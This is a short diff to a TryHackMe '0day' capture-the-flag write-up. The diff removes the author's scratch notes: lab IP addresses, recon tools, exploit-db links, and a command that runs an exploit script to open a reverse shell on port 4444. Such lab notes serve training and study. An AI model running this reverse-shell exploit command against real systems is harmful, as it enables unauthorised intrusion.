@@ -1,22 +1,3 @@
-
-HOST: 10.10.80.192
-TARGET: 10.10.246.157
-
-
-
-nmap
-gobuster
-nikto -h 10.10.50.50
-
-https://www.exploit-db.com/exploits/34900
-python2.7 exploit.py payload=reverse rhost=10.10.143.96 lhost=10.10.186.67 lport=4444
-
-
-https://www.exploit-db.com/exploits/37292
-export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-
-
-
 # TryHackMe: 0day
 
 ## Challenge Description
